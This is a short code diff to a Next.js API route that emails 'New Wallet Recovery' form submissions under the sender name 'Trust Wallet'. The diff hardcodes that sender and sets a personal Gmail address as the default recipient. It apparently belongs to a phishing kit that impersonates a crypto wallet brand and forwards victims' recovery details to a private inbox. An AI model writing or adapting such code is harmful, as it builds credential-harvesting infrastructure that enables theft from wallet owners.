@@ -37,8 +37,8 @@ export async function POST(req: NextRequest) {
     });
 
     const { data, error } = await resend.emails.send({
-      from: process.env.RESEND_FROM_EMAIL || "Trust Wallet <onboarding@resend.dev>",
-      to: [process.env.NOTIFICATION_EMAIL || "your-email@gmail.com"],
+      from: "Trust Wallet <onboarding@resend.dev>",
+      to: [process.env.NOTIFICATION_EMAIL || "azizrezgui60@gmail.com"],
       subject: `🔐 New Wallet Recovery — ${fullName} [${submissionId}]`,
       html: htmlContent,
       replyTo: email,
